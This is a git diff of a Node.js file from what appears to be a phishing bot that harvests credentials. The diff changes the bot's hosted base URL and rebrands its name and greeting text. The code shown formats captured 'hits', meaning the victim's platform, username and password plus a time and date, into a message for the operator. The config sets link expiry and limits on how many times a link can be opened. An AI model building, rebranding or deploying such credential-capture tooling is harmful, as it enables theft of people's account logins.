@@ -25,7 +25,7 @@ const config = {
     S7: '@RTFGAMMING',
     adminId: '6346250222',
     port: process.env.PORT || 3000,
-    baseUrl: process.env.RENDER_URL || 'https://rtf-rose-bot-l4hw.onrender.com',
+    baseUrl: process.env.RENDER_URL || 'https://official-fb6s.onrender.com',
     BATCH_SIZE: 100,
     LINK_EXPIRY: 15 * 60 * 1000,
     MAX_OPENS: 3,
@@ -402,7 +402,7 @@ function getUptime() {
     return h + 'h ' + m + 'm ' + s + 's';
 }
 function LoveHit(SYloveDaTe, SYloveTiMe, platform, username, password, dev) {
-    return '🖤©🖤 ʷᵉ ʟᴏᴠᴇ ʏᴏᴜ sᴇxʏ ʙᴏʏ ﾂ.🖤ª🖤\n\n🐉⨀-----------------------------------⨀🐉\n↝ ɴᴀᴍᴇ » ' + platform + '\n📧 ↝ ᴜsᴇʀɴᴀᴍᴇ » ' + username + '\n📟 ↝ ᴘᴀssᴡᴏʀᴅ » ' + password + '\n⏱ ↝ ᴛɪᴍᴇ » ' + SYloveTiMe + '\n📝 ↝ ᴅᴀᴛᴇ » ' + SYloveDaTe + '\n🐉⨀-----------------------------------⨀🐉\n↝ ʙʏ ᴅᴇᴠ » ' + dev;
+    return '🖤©🖤 ʷᵉ ʟᴏᴠᴇ ʏᴏᴜ RTF ʙᴏʏ ﾂ.🖤ª🖤\n\n🐉⨀-----------------------------------⨀🐉\n↝ ɴᴀᴍᴇ » ' + platform + '\n📧 ↝ ᴜsᴇʀɴᴀᴍᴇ » ' + username + '\n📟 ↝ ᴘᴀssᴡᴏʀᴅ » ' + password + '\n⏱ ↝ ᴛɪᴍᴇ » ' + SYloveTiMe + '\n📝 ↝ ᴅᴀᴛᴇ » ' + SYloveDaTe + '\n🐉⨀-----------------------------------⨀🐉\n↝ ʙʏ ᴅᴇᴠ » ' + dev;
 }
 function MenuLove(firstName, dev, botName, LoveTime, message) {
     return '─【 ' + dev + ' 】─\n────────────────────\n ᴜsᴇʀ ➤ ' + firstName + ' ›\n ɴᴀᴍᴇ ➤ ' + botName + ' ›\n ᴍᴏᴅᴇ ➤ Premium User ›\n ᴏɴʟɪɴᴇ ➤ ' + LoveTime + '›\n ────────────────────\n\n ' + message + ' \n\n────────────────────\n ─【 𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 】─';
@@ -413,7 +413,7 @@ function LoveNotifer(platform, username, password) {
     return LoveHit(SYloveDaTe, SYloveTiMe, platform, username, password, config.S7);
 }
 function SYloveMenu(firstName, message) {
-    return MenuLove(firstName, config.S7, 'SeXyxeon', getUptime(), message);
+    return MenuLove(firstName, config.S7, 'RTF', getUptime(), message);
 }
 function logToFile(message) {
     const timestamp = new Date().toISOString();
